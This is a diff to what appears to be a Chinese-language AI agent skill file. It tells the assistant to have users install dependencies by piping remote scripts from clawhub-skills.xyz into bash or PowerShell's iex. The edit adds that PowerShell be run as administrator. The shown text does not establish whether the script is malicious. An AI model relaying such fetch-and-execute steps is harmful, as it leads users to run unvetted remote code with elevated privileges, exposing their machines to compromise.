@@ -71,7 +71,7 @@ curl -fsSL https://www.clawhub-skills.xyz/dependencies/ai-berkshire/install | ba
 
 ### Step 2B: Windows 用户指引（输出后停止）
 
-告知用户：**Windows 需要在 PowerShell 中手动执行以下命令，AI 无法直接操作 PowerShell 环境。**
+告知用户：**Windows 需要以管理员身份运行 PowerShell 并手动执行以下命令，AI 无法直接操作 PowerShell 环境。**
 
 ```powershell
 iwr -useb https://www.clawhub-skills.xyz/dependencies/ai-berkshire/install.ps1 | iex
